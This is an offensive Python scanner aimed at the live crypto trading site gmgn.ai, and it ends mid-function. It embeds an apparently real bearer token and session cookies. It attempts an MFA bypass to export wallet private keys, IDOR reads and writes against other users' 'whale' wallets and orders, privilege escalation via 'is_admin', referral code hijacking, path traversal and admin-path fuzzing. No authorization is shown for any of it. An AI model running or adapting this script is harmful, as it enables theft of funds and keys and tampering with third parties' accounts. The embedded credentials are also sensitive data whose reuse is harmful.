#!/usr/bin/env python3
"""
MEGA HUNTER — Comprehensive endpoint scanner for gmgn.ai
Targets undiscovered API surfaces, IDOR, privilege escalation, 
wallet manipulation, batch operations, and admin paths.
"""
import json
import requests
import time
import sys
from datetime import datetime, timezone

# ============================================================================
# CONFIG
# ============================================================================
ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzEzLTIwNDQtYTdjNmJmNCIsImRldmljZV9pZCI6ImRlNjIwYTU3LWQ5OGUtNDI5My1iMDA3LTVkMzE1NDU1ZTIxZCIsImZhdGhlcl9pZCI6IjQ5ZjM2ZDlkLThhNTAtNDJlNi05NTJkLTk2N2EwNWUyMDc4OCIsImZpbmdlcnByaW50IjoidjE1MzI0N2I5ZTBlMTg0ZmJlZDNmYWM3M2YxOWRjYTY4YSIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODQwNjI1MDQsImlhdCI6MTc4NDA2MDcwNCwiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiIzY2UzY2NmOS0xZjViLTRlODYtYjU3OS1mZWUzMzdmMjgyM2YiLCJuYmYiOjE3ODQwNjA3MDQsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsInZlciI6IjEuMCJ9.WaOebjBm_DeYq3jvoA5kszO7hqbIhzU5ymDBatjDBfGatvZg26IEvA1OgOs-B7OQbyL5fA3JhaZSy817ulE9gw"

BASE = "https://gmgn.ai"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"
OUR_SOL_WALLET = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"
OUR_BSC_WALLET = "0x0a4a0836142fcf94ce100b6d7790c50786ffbcff"

# Target wallets (whales from rankings — NOT ours)
TARGET_BSC_WHALE = "0xb4f701538bf492dacb088d4d932ab105c127f89d"
TARGET_SOL_WHALE = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"

COOKIES = {
    "_ga_UGLVBMV4Z0": "GS1.2.1783973647439438.6b09445dc224ac4ed190f0fc17562c09.WNMkxJkx11naYGkCSvritw%3D%3D.n7rcVNVAG1ummnX2QRVk8Q%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.gcUSGxiE3YGdviSrgoID2g%3D%3D",
    "__cf_bm": "9qa7eXAqqNE3bSIxMZwpppcTOZY3P3xN.FEEMJbhNBA-1783973660.6075041-1.0.1.1-xpP4LEhY807gRqRYG17gELVZ7mRp7mVSjEqwfW1TAi3o.r3e0ELz2XeH_UF7bMbaVLh6sqq3gLWVVuwMeLhnT4JzDtVBTOnmsANgwP0Ocq2q7hH2bL_0726EfGBcn9Ml",
    "_ga_0XM0LYXGC8": "GS2.1.s1783971651$o31$g1$t1783973720$j26$l0$h0",
    "_ga": "GA1.1.1499118900.1783283677",
    "_csrf": "4-NQvufozCNXqp4NJtA6IpuwRk812C5t",
    "_did": "c800ab0b7d01aa37bc93aacdcbce271e",
    "_wt": "AWpegY9oS-pwZPEJE_DCiED4eeyVHRTBs5VBiak",
    "sid": "gmgn%7C82f74adfe6d87dce9893a1c416af82e9",
}

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "client_id": "gmgn_web_20260713-2044-a7c6bf4",
    "from_app": "gmgn",
    "app_ver": "20260713-2044-a7c6bf4",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
}

# ============================================================================
# HELPERS
# ============================================================================
findings = []
request_count = 0

def log_finding(severity, category, endpoint, detail, response_data=None):
    finding = {
        "severity": severity,
        "category": category,
        "endpoint": endpoint,
        "detail": detail,
        "response_snippet": str(response_data)[:500] if response_data else None,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    findings.append(finding)
    icon = {"CRITICAL": "💀", "HIGH": "🔥", "MEDIUM": "⚠️", "LOW": "ℹ️", "INFO": "📋"}
    print(f"  {icon.get(severity, '?')} [{severity}] {category}: {detail}")

def req(method, path, payload=None, description="", extra_headers=None):
    global request_count
    request_count += 1
    
    url = f"{BASE}{path}" if path.startswith("/") else path
    h = {**HEADERS}
    if extra_headers:
        h.update(extra_headers)
    
    try:
        if method == "GET":
            r = requests.get(url, headers=h, cookies=COOKIES, params=PARAMS, timeout=12)
        elif method == "POST":
            r = requests.post(url, headers=h, cookies=COOKIES, params=PARAMS, json=payload or {}, timeout=12)
        elif method == "PUT":
            r = requests.put(url, headers=h, cookies=COOKIES, params=PARAMS, json=payload or {}, timeout=12)
        elif method == "DELETE":
            r = requests.delete(url, headers=h, cookies=COOKIES, params=PARAMS, json=payload or {}, timeout=12)
        elif method == "PATCH":
            r = requests.patch(url, headers=h, cookies=COOKIES, params=PARAMS, json=payload or {}, timeout=12)
        else:
            return None
        
        return r
    except requests.exceptions.Timeout:
        print(f"  [TIMEOUT] {method} {path}")
        return None
    except Exception as e:
        print(f"  [ERROR] {method} {path}: {e}")
        return None

def test_endpoint(method, path, payload=None, description=""):
    """Test endpoint and analyze response."""
    print(f"\n  [{request_count+1}] {method} {path}")
    if description:
        print(f"      → {description}")
    
    r = req(method, path, payload)
    if r is None:
        return None
    
    print(f"      Status: {r.status_code} | Size: {len(r.text)} bytes")
    
    # Analyze response
    try:
        data = r.json()
        code = data.get("code")
        msg = data.get("message", "")
        
        # Check for interesting patterns
        text = r.text.lower()
        
        if r.status_code == 200 and code == 0:
            print(f"      ✅ code:0 success | msg: {msg}")
            
            # Check for token leaks
            if "eyj" in text:
                log_finding("CRITICAL", "TOKEN_LEAK", path, 
                           f"JWT token found in response!", data)
            
            # Check for sensitive data
            sensitive_keys = ["private_key", "secret", "api_key", "password", 
                           "mnemonic", "seed", "export", "key_data"]
            for sk in sensitive_keys:
                if sk in text:
                    log_finding("HIGH", "SENSITIVE_DATA", path,
                               f"Sensitive key '{sk}' in response", data)
            
            return data
        
        elif r.status_code == 200:
            print(f"      📋 code:{code} | msg: {msg}")
            # Still interesting — server processed but returned app-level error
            if code and code > 0:
                return data
        
        elif r.status_code == 400:
            # Validation errors reveal field names
            if "Error:Field validation" in r.text:
                print(f"      📋 Validation error reveals fields: {msg[:200]}")
                return data
        
        elif r.status_code == 403:
            print(f"      🔒 Forbidden: {msg[:100]}")
        
        elif r.status_code == 404:
            print(f"      ❌ Not found")
        
        return data if r.status_code < 500 else None
        
    except json.JSONDecodeError:
        if r.status_code == 200 and len(r.text) > 100:
            print(f"      📋 Non-JSON 200 response ({len(r.text)} bytes)")
            if "eyj" in r.text.lower():
                log_finding("CRITICAL", "TOKEN_LEAK", path,
                           "JWT in non-JSON response!", r.text[:500])
        return r.text if r.status_code == 200 else None

# ============================================================================
# PHASE 1: WALLET-API SURFACE (CRITICAL — money operations)
# ============================================================================
def phase_wallet_api():
    print("\n" + "="*80)
    print("🏦 PHASE 1: WALLET-API DEEP PROBE")
    print("="*80)
    
    # 1. Get wallet configs (may reveal internal wallet structure)
    test_endpoint("GET", "/wallet-api/v1/wallet/get_configs",
                  description="Wallet configuration — may reveal internal settings")
    
    test_endpoint("POST", "/wallet-api/v1/wallet/get_configs",
                  payload={"chain": "sol"},
                  description="Wallet config with chain param")
    
    # 2. Get wallet groups (organizational structure)
    test_endpoint("GET", "/wallet-api/v1/wallet/get_groups",
                  description="Wallet groups — internal organization")
    
    test_endpoint("POST", "/wallet-api/v1/wallet/get_groups",
                  payload={},
                  description="Wallet groups POST")
    
    # 3. Set configs IDOR — try to modify another user's config
    test_endpoint("POST", "/wallet-api/v1/wallet/set_configs",
                  payload={"chain": "sol", "config": {"auto_sign": True}},
                  description="Set wallet config — can we enable auto-sign?")
    
    # 4. BATCH IMPORT KEY — this is HUGE if it works
    test_endpoint("POST", "/wallet-api/v1/batch_import_key",
                  payload={"chain": "sol", "keys": []},
                  description="Batch import — reveals expected key format")
    
    test_endpoint("POST", "/wallet-api/v1/batch_import_key",
                  payload={},
                  description="Batch import empty — get validation errors")
    
    # 5. Delete address (can we delete other user's whitelist entries?)
    test_endpoint("POST", "/wallet-api/v1/delete_address",
                  payload={"address_id": "77af5622-ad85-4809-86e9-f99b198805e2"},
                  description="Delete whitelist address by ID")
    
    # 6. Batch query order (may leak other users' order data)
    test_endpoint("POST", "/wallet-api/v1/batch_query_order",
                  payload={"order_ids": ["757a0b51-1f2a-4f1c-abbf-69eaca64c6b4"]},
                  description="Batch query orders — try old order ID")
    
    # 7. Export key with MFA bypass
    # First generate txn_id via the bypass
    print("\n  [*] Attempting MFA bypass for export_key...")
    r = req("POST", "/wallet-api/v1/generate_mfa_params",
            payload={
                "usage": "export_key",
                "biz_params": {
                    "chain": "sol",
                    "address": OUR_SOL_WALLET
                }
            })
    
    if r and r.status_code == 200:
        try:
            data = r.json()
            print(f"      generate_mfa_params response: {json.dumps(data)[:300]}")
            txn_id = data.get("data", {}).get("txn_id", "")
            verify_items = data.get("data", {}).get("verify_items", [])
            
            if not verify_items:
                log_finding("CRITICAL", "MFA_BYPASS", "/wallet-api/v1/generate_mfa_params",
                           f"export_key usage returns EMPTY verify_items! txn_id={txn_id}", data)
                
                # Now try to actually export the key!
                if txn_id:
                    export_r = test_endpoint("POST", "/wallet-api/v1/export_key",
                                           payload={
                                               "TxnId": txn_id,
                                               "Address": OUR_SOL_WALLET,
                                               "Chain": "sol",
                                               "EncryptedKey": ""
                                           },
                                           description="EXPORT KEY WITH BYPASS TXN_ID!")
                    if export_r:
                        log_finding("CRITICAL", "KEY_EXPORT", "/wallet-api/v1/export_key",
                                   f"Export key response received!", export_r)
            else:
                print(f"      verify_items: {verify_items}")
                log_finding("INFO", "MFA_CHECK", "/wallet-api/v1/generate_mfa_params",
                           f"export_key requires: {verify_items}", data)
        except Exception as e:
            print(f"      Parse error: {e}")
    
    # 8. Generate MFA params for various usages (discover all bypass-able operations)
    usages = ["transfer", "export_key", "bind_wallet", "unbind_wallet", 
              "set_whitelist", "delete_wallet", "import_key", "withdrawal"]
    
    print("\n  [*] Testing all MFA usage types...")
    for usage in usages:
        r = req("POST", "/wallet-api/v1/generate_mfa_params",
                payload={"usage": usage, "biz_params": {"chain": "sol"}})
        if r and r.status_code == 200:
            try:
                data = r.json()
                vi = data.get("data", {}).get("verify_items", ["UNKNOWN"])
                tid = data.get("data", {}).get("txn_id", "")
                status = "🔓 NO MFA" if not vi else f"🔒 {vi}"
                print(f"      usage={usage:15s} → {status} | txn_id={tid[:20] if tid else 'none'}")
                if not vi and tid:
                    log_finding("CRITICAL", "MFA_BYPASS", "/wallet-api/v1/generate_mfa_params",
                               f"Usage '{usage}' has NO verification!", data)
            except:
                pass
    
    # 9. Whitelist — get for multiple chains
    for chain in ["sol", "bsc", "eth", "tron", "base", "megaeth", "monad"]:
        r = req("GET", f"/wallet-api/v1/get_whitelist_address?chain={chain}")
        if r and r.status_code == 200:
            try:
                data = r.json()
                if data.get("data"):
                    print(f"      Chain {chain}: whitelist data = {json.dumps(data['data'])[:200]}")
            except:
                pass

# ============================================================================
# PHASE 2: TRADING API DEEP PROBE (IDOR + privilege escalation)
# ============================================================================
def phase_trading_api():
    print("\n" + "="*80)
    print("📈 PHASE 2: TRADING API DEEP PROBE")
    print("="*80)
    
    # 1. Set delegation — can we delegate trading to another wallet?
    test_endpoint("POST", "/tapi/v1/set_delegation",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET,
                          "delegate_address": TARGET_SOL_WHALE},
                  description="Set delegation — delegate our wallet to whale?")
    
    test_endpoint("POST", "/tapi/v1/set_delegation",
                  payload={},
                  description="Set delegation empty — get field validation")
    
    # 2. Create token (can we mint tokens?)
    test_endpoint("POST", "/tapi/v1/create_token",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET},
                  description="Create token — reveals token creation flow")
    
    # 3. Close token account (close anyone's token account?)
    test_endpoint("POST", "/tapi/v1/close_token_account",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET,
                          "token_address": "So11111111111111111111111111111111111111112"},
                  description="Close token account")
    
    # 4. Get account token list (IDOR — try whale wallet)
    test_endpoint("POST", "/tapi/v1/get_account_token_list",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET},
                  description="Our token list")
    
    test_endpoint("POST", "/tapi/v1/get_account_token_list",
                  payload={"chain": "sol", "wallet_address": TARGET_SOL_WHALE},
                  description="IDOR: Whale's token list")
    
    # 5. Query order (IDOR on order IDs)
    test_endpoint("POST", "/tapi/v1/query_order",
                  payload={"order_id": "757a0b51-1f2a-4f1c-abbf-69eaca64c6b4"},
                  description="Query old order by ID — IDOR check")
    
    test_endpoint("POST", "/tapi/v1/query_order",
                  payload={"order_id": "a27c36d5-2cc5-4879-b492-c32e07e63a4c"},
                  description="Query BSC order — IDOR check")
    
    # 6. Refresh trade token
    test_endpoint("POST", "/tapi/v1/refresh_trade_token",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET},
                  description="Refresh trade token — may return signing token!")
    
    # 7. Reset nonce (dangerous — could disrupt MPC signing)
    test_endpoint("POST", "/tapi/v1/reset_nonce",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET},
                  description="Reset nonce — MPC signing manipulation")
    
    # 8. Submit TX (raw transaction submission)
    test_endpoint("POST", "/tapi/v1/submit_tx",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET,
                          "raw_tx": ""},
                  description="Submit TX — reveals raw TX format expected")
    
    # 9. Swap native order
    test_endpoint("POST", "/tapi/v1/swap_native_order",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET,
                          "amount": "1000"},
                  description="Swap native order")
    
    # 10. Wallet operations
    test_endpoint("POST", "/tapi/v1/wallet/set_primary",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET},
                  description="Set primary wallet")
    
    # IDOR: Set someone else's wallet as primary in OUR account
    test_endpoint("POST", "/tapi/v1/wallet/set_primary",
                  payload={"chain": "sol", "wallet_address": TARGET_SOL_WHALE},
                  description="IDOR: Set WHALE wallet as our primary!")
    
    # 11. Wallet archive/restore/delete
    test_endpoint("POST", "/tapi/v1/wallet/archive",
                  payload={"chain": "sol", "wallet_address": TARGET_SOL_WHALE},
                  description="IDOR: Archive whale's wallet!")
    
    # 12. Wallet manager history (info disclosure)
    test_endpoint("POST", "/tapi/v1/wallet/manager_history",
                  payload={"chain": "sol"},
                  description="Wallet manager history — activity logs")
    
    test_endpoint("GET", "/tapi/v1/wallet/manager_history",
                  description="Wallet manager history GET")
    
    # 13. Strategy order endpoints
    test_endpoint("POST", "/tapi/v1/trading_bot/strategy_order/open_list",
                  payload={"chain": "sol"},
                  description="Open strategy orders")
    
    test_endpoint("POST", "/tapi/v1/trading_bot/strategy_order/history_list",
                  payload={"chain": "sol"},
                  description="Strategy order history — may reveal other users' orders")
    
    # 14. Withdraw reserve fee
    test_endpoint("POST", "/tapi/v1/withdraw/reserve_fee",
                  payload={"chain": "sol", "amount": "1000000"},
                  description="Withdraw reserve fee — fee manipulation")
    
    # 15. Router endpoints
    test_endpoint("POST", "/defi/router/v1/tx/route_simulate_tx",
                  payload={"chain": "sol", "from_address": OUR_SOL_WALLET,
                          "to_token": "So11111111111111111111111111111111111111112",
                          "amount": "1000"},
                  description="Route simulate TX — trade simulation")
    
    test_endpoint("POST", "/defi/router/v1/tx/approve_address",
                  payload={"chain": "bsc"},
                  description="Get approve address — router contract info")

# ============================================================================
# PHASE 3: USER/SOCIAL ENDPOINTS (IDOR + info disclosure)
# ============================================================================
def phase_user_social():
    print("\n" + "="*80)
    print("👤 PHASE 3: USER/SOCIAL ENDPOINTS")
    print("="*80)
    
    # 1. User info (our own — baseline)
    result = test_endpoint("POST", "/account/user_info",
                          payload={},
                          description="Our user info — baseline")
    
    # 2. Follow wallet (can we follow and get alerts for any wallet?)
    test_endpoint("POST", "/api/v1/follow/follow_wallet",
                  payload={"wallet_address": TARGET_BSC_WHALE, "chain": "bsc"},
                  description="Follow whale wallet — test alerts")
    
    # 3. Follow wallet list (get all followed wallets — may include private info)
    test_endpoint("POST", "/api/v1/follow/follow_wallet_list",
                  payload={"chain": "bsc"},
                  description="Our follow list")
    
    test_endpoint("GET", "/api/v1/follow/follow_wallet_page_multi_chain",
                  description="Multi-chain follow page")
    
    # 4. Activity wallet list (reveals active trading wallets)
    test_endpoint("GET", "/api/v1/activity/wallet_list",
                  description="Activity wallet list — reveals active wallets")
    
    test_endpoint("GET", "/api/v1/activity/wallet_available",
                  description="Activity wallet available")
    
    # 5. User config (internal settings)
    test_endpoint("GET", "/api/v1/user_config/get",
                  description="User config — internal settings")
    
    # 6. Update user config (can we escalate privileges?)
    test_endpoint("POST", "/api/v1/user_config/update",
                  payload={"vip_level": 5, "is_admin": True},
                  description="Update config — privilege escalation attempt")
    
    # 7. VIP level check + upgrade attempt
    test_endpoint("GET", "/api/v1/user_vip_level",
                  description="Current VIP level")
    
    test_endpoint("POST", "/api/v1/user_apply_vip",
                  payload={},
                  description="Apply for VIP — any bypass?")
    
    test_endpoint("POST", "/api/v1/user_apply_vip1",
                  payload={},
                  description="Apply VIP1 — escalation")
    
    # 8. Upload URL generation (SSRF potential)
    test_endpoint("POST", "/api/v1/user/generate_upload_url",
                  payload={"file_name": "test.png", "content_type": "image/png"},
                  description="Generate upload URL — SSRF check")
    
    test_endpoint("POST", "/api/v1/user/generate_video_upload_url",
                  payload={"file_name": "test.mp4", "content_type": "video/mp4"},
                  description="Generate video upload URL")
    
    # 9. Upload URL with path traversal
    test_endpoint("POST", "/api/v1/user/generate_upload_url",
                  payload={"file_name": "../../../etc/passwd", "content_type": "image/png"},
                  description="Upload URL — path traversal attempt")
    
    # 10. X (Twitter) auth (OAuth flow — may leak tokens)
    test_endpoint("POST", "/api/v1/x/auth/start",
                  payload={},
                  description="X/Twitter OAuth start — may return OAuth URL with secrets")
    
    test_endpoint("GET", "/api/v1/x/accounts/list",
                  description="List linked X accounts")
    
    # 11. Person wallets PNL info (IDOR)
    test_endpoint("GET", "/api/v1/person_wallets_pnl_info",
                  description="Personal PNL info")
    
    # 12. Wallet holding info
    test_endpoint("POST", "/api/v1/wallet_holding_info",
                  payload={"wallet_address": TARGET_BSC_WHALE, "chain": "bsc"},
                  description="IDOR: Whale holding info")
    
    # 13. Batch remark wallets (mass operation)
    test_endpoint("POST", "/api/v1/batch_remark_wallets",
                  payload={"wallets": [{"address": TARGET_BSC_WHALE, "remark": "pwned"}]},
                  description="Batch remark — can we tag whale wallets?")
    
    # 14. Follow alerts
    test_endpoint("POST", "/api/v1/follow/follow_alert",
                  payload={"wallet_address": TARGET_BSC_WHALE, "chain": "bsc",
                          "alert_types": ["buy", "sell", "transfer"]},
                  description="Set alerts on whale — surveillance")
    
    # 15. Follow alert batch update
    test_endpoint("POST", "/api/v1/follow/follow_alert/batch_update",
                  payload={"alerts": [{"wallet_address": TARGET_BSC_WHALE, 
                                      "chain": "bsc", "enabled": True}]},
                  description="Batch alert update")

# ============================================================================
# PHASE 4: VAS (Value Added Services) + Telegram Integration
# ============================================================================
def phase_vas_tg():
    print("\n" + "="*80)
    print("📡 PHASE 4: VAS + TELEGRAM ENDPOINTS")
    print("="*80)
    
    # 1. Batch handler (mass operations)
    test_endpoint("POST", "/vas/api/v1/batch_handler",
                  payload={"requests": [
                      {"path": "/api/v1/user_info", "method": "GET"},
                      {"path": "/wallet-api/v1/export_key", "method": "POST", 
                       "body": {"address": OUR_SOL_WALLET}}
                  ]},
                  description="Batch handler — bypass rate limits?")
    
    # 2. Search (info disclosure)
    test_endpoint("GET", "/vas/api/v1/search_v3?q=admin",
                  description="Search for admin accounts")
    
    test_endpoint("GET", "/vas/api/v1/search_info?q=admin@gmgn.ai",
                  description="Search info — admin email lookup")
    
    # 3. Telegram channels (reveals internal TG structure)
    test_endpoint("GET", "/vas/api/v1/tg/channels",
                  description="TG channels — internal comms?")
    
    test_endpoint("GET", "/vas/api/v1/tg/mine/channels",
                  description="My TG channels")
    
    test_endpoint("GET", "/vas/api/v1/tg/mine/channel_ids",
                  description="My TG channel IDs")
    
    test_endpoint("GET", "/vas/api/v1/tg/messages",
                  description="TG messages — data leak?")
    
    test_endpoint("GET", "/vas/api/v1/tg/mine/messages",
                  description="My TG messages")
    
    # 4. TG channel operations (can we join/modify channels?)
    test_endpoint("POST", "/vas/api/v1/tg/mine/channels/operate",
                  payload={"operation": "join", "channel_id": "admin_channel"},
                  description="TG channel operation — join admin channel?")
    
    # 5. Twitter user import (mass data)
    test_endpoint("POST", "/vas/api/v1/twitter/user/import",
                  payload={"users": ["elonmusk"]},
                  description="Twitter user import")
    
    # 6. Token signals (intelligence)
    test_endpoint("GET", "/vas/api/v1/token-signal/rank",
                  description="Token signal rank — trading intelligence")
    
    # 7. Wallet activity (IDOR)
    test_endpoint("POST", "/vas/api/v1/wallet_activity",
                  payload={"wallet_address": TARGET_BSC_WHALE, "chain": "bsc"},
                  description="IDOR: Whale wallet activity")
    
    # 8. Follow wallet search
    test_endpoint("POST", "/vas/api/v1/follow/wallet/search",
                  payload={"query": "0x"},
                  description="Follow wallet search — enumeration")

# ============================================================================
# PHASE 5: REFERRAL/REBATE DEEP DIVE
# ============================================================================
def phase_referral():
    print("\n" + "="*80)
    print("💰 PHASE 5: REFERRAL/REBATE EXPLOITATION")
    print("="*80)
    
    # 1. Get invitation code
    test_endpoint("POST", "/defi/quotation/v1/invite/get_tg_invitation_code",
                  payload={},
                  description="Get our invitation code")
    
    # 2. Update invitation code (can we hijack existing codes?)
    test_endpoint("POST", "/defi/quotation/v1/invite/update_invitation_code",
                  payload={"code": "ADMIN"},
                  description="Set invite code to 'ADMIN' — collision attack")
    
    test_endpoint("POST", "/defi/quotation/v1/invite/update_invitation_code",
                  payload={"code": "WFgLmx3u"},
                  description="Hijack existing invite code!")
    
    # 3. Add invite info (inject ourselves as referrer)
    test_endpoint("POST", "/defi/quotation/v1/invite/add_tg_invite_info",
                  payload={"invite_code": "ADMIN", "inviter_id": OUR_USER_ID},
                  description="Add TG invite info — inject as inviter")
    
    test_endpoint("POST", "/defi/quotation/v1/invite/add_tx_tg_invite_info",
                  payload={"invite_code": "ADMIN", "inviter_id": OUR_USER_ID},
                  description="Add TX TG invite — injection")
    
    # 4. Get invitation lists (data disclosure)
    test_endpoint("GET", "/defi/quotation/v1/invite/get_tg_tg_invitation_info_list",
                  description="TG invitation list — reveals inviter chain")
    
    test_endpoint("GET", "/defi/quotation/v1/invite/get_tg_wallet_invitation_info_list",
                  description="Wallet invitation list")
    
    test_endpoint("GET", "/defi/quotation/v1/invite/get_user_invitation_info_list",
                  description="User invitation list — all referrals")
    
    # 5. Rebate rewards history
    test_endpoint("GET", "/defi/quotation/v1/rebate/get_rebate_rewards_history",
                  description="Rebate rewards history")
    
    test_endpoint("GET", "/defi/quotation/v1/rebate/get_user_token_rebate_list",
                  description="Token rebate list")
    
    test_endpoint("GET", "/defi/quotation/v1/rebate/get_tg_rebate_rewards_history",
                  description="TG rebate history")
    
    # 6. Rebate claim (exploit)
    test_endpoint("POST", "/defi/quotation/v1/rebate/rebate_claim_apply",
                  payload={"chain": "sol"},
                  description="Rebate claim — our account")
    
    test_endpoint("POST", "/defi/quotation/v1/rebate/rebate_tg_claim_apply",
                  payload={"chain": "sol"},
                  description="TG rebate claim")
    
    # 7. Cashback profile + pending (IDOR)
    test_endpoint("GET", "/rebate/api/v1/cashback/profile",
                  description="Cashback profile")
    
    test_endpoint("GET", "/rebate/api/v1/cashback/pending",
                  description="Pending cashback")
    
    test_endpoint("GET", "/rebate/api/v1/cashback/claim/records",
                  description="Cashback claim records")
    
    # 8. Wallet amount (financial disclosure)
    test_endpoint("GET", "/rebate/api/v1/wallet/amount_sol",
                  description="Wallet SOL amount")
    
    # 9. Register wallet IDOR — register whale wallets under us
    test_endpoint("POST", "/defi/quotation/v1/register_wallet",
                  payload={"chain": "bsc", "address": TARGET_BSC_WHALE,
                          "invite_code": "ADMIN", "referrer": OUR_USER_ID},
                  description="IDOR: Register whale under our referral!")

# ============================================================================
# PHASE 6: ADMIN/INTERNAL PATH FUZZING
# ============================================================================
def phase_admin():
    print("\n" + "="*80)
    print("🔐 PHASE 6: ADMIN/INTERNAL PATH FUZZING")
    print("="*80)
    
    admin_paths = [
        "/admin", "/admin/", "/admin/api", "/admin/users",
        "/internal", "/internal/api", "/internal/health",
        "/debug", "/debug/pprof", "/debug/vars",
        "/metrics", "/health", "/healthz", "/ready",
        "/swagger", "/swagger.json", "/swagger/index.html",
        "/api/docs", "/api/v1/docs", "/openapi.json",
        "/actuator", "/actuator/health", "/actuator/env",
        "/.env", "/config", "/config.json",
        "/api/v1/admin/users", "/api/v1/admin/stats",
        "/account/admin", "/account/admin/users",
        "/account/internal/user_list",
        "/wallet-api/v1/admin", "/wallet-api/v1/internal",
        "/tapi/v1/admin", "/tapi/v1/internal",
        "/api/v1/system/info", "/api/v1/system/stats",
        "/graphql", "/graphiql",
        "/ws", "/wss", "/socket.io",
        "/api/4508002799255552/envelope/",  # Sentry DSN from JS
    ]
    
    for path in admin_paths:
        r = req("GET", path)
        if r and r.status_code not in [404, 403, 301, 302, 0]:
            print(f"  [!] {path} → {r.status_code} ({len(r.text)} bytes)")
            if r.status_code == 200 and len(r.text) > 50:
                log_finding("HIGH", "ADMIN_ENDPOINT", path,
                           f"Admin/internal endpoint accessible! Status: {r.status_code}",
                           r.text[:300])
        elif r and r.status_code in [301, 302]:
            loc = r.headers.get("Location", "")
            print(f"  [→] {path} → redirect to {loc}")

# ============================================================================
# PHASE 7: ACCOUNT MANIPULATION
# ============================================================================
def phase_account():
    print("\n" + "="*80)
    print("🔑 PHASE 7: ACCOUNT MANIPULATION")
    print("="*80)
    
    # 1. IP location (info disclosure)
    test_endpoint("GET", "/account/iploc",
                  description="IP location — server-side IP info")
    
    # 2. Get all passkeys (auth inventory)
    test_endpoint("GET", "/account/otp/get_all_passkeys",
                  description="All passkeys — auth methods enumeration")
    
    test_endpoint("POST", "/account/otp/get_all_passkeys",
                  payload={},
                  description="Passkeys POST")
    
    # 3. Public key endpoint
    test_endpoint("GET", "/account/pubkey",
                  description="RSA public key for encryption")
    
    # 4. Bind/unbind wallet (MFA bypass potential)
    # Try generate_mfa_params with bind_wallet usage
    r = req("POST", "/wallet-api/v1/generate_mfa_params",
            payload={"usage": "bind_wallet", "biz_params": {
                "chain": "sol", "address": "AttackerWalletAddress123456789"
            }})
    if r and r.status_code == 200:
        try:
            data = r.json()
            print(f"  bind_wallet MFA: {json.dumps(data)[:300]}")
            vi = data.get("data", {}).get("verify_items", ["?"])
            if not vi:
                log_finding("CRITICAL", "MFA_BYPASS", "bind_wallet",
                           "bind_wallet has NO MFA!", data)
        except:
            pass
    
    # 5. Account generate_mfa_params (different service than wallet-api)
    test_endpoint("POST", "/account/account/generate_mfa_params",
                  payload={"usage": "passkey_registration"},
                  description="Account-level MFA params")
    
    test_endpoint("POST", "/account/account/generate_mfa_params",
                  payload={"usage": "bind_wallet"},
                  description="Account-level bind_wallet MFA")
    
    test_endpoint("POST", "/account/account/generate_mfa_params",
                  payload={"usage": "delete_account"},
                  description="Account-level delete_account MFA")
    
    # 6. Try to verify wallet signature with forged data
    test_endpoint("POST", "/account/mfa/txn/v1/verify_wallet_signature",
                  payload={
                      "txn_id": "00000000-0000-0000-0000-000000000000",
                      "message": "test",
                      "signature": "0x" + "00" * 65,
                      "address": OUR_SOL_WALLET,
                      "chain": "sol",
                      "usage": "transfer"
                  },
                  description="Verify wallet sig — forged data test")
    
    # 7. Logout endpoint (check what it reveals)
    # DON'T actually logout — just check the method
    test_endpoint("GET", "/account/logout",
                  description="Logout GET — info check (won't kill session?)")

# ============================================================================
# PHASE 8: SOLANA-SPECIFIC ATTACKS
# ============================================================================
def phase_solana():
    print("\n" + "="*80)
    print("⚡ PHASE 8: SOLANA-SPECIFIC ATTACKS")
    print("="*80)
    
    # 1. Create token preview
    test_endpoint("POST", "/xapi/v1/sol/create_token/preview",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET,
                          "name": "Test", "symbol": "TST", "decimals": 9,
                          "supply": "1000000000"},
                  description="Sol create token preview — reveals creation flow")
    
    # 2. Delay query (reveals internal job system)
    test_endpoint("POST", "/tapi/v1/delay/query_cid",
                  payload={"cid": "test-cid-123"},
                  description="Delay query CID — internal job system")
    
    # 3. Limit order adjust (IDOR — adjust someone else's order?)
    test_endpoint("POST", "/tapi/v1/limit_order/v2/adjust_params",
                  payload={"order_id": "757a0b51-1f2a-4f1c-abbf-69eaca64c6b4",
                          "slippage": 99, "trigger_price": "0.0000001"},
                  description="IDOR: Adjust old order params!")
    
    # 4. Strategy order chain cond (conditional orders)
    test_endpoint("POST", "/tapi/v1/trading_bot/strategy_order/chain_cond_order/list",
                  payload={"chain": "sol"},
                  description="Chain conditional orders list")
    
    # 5. Open order count
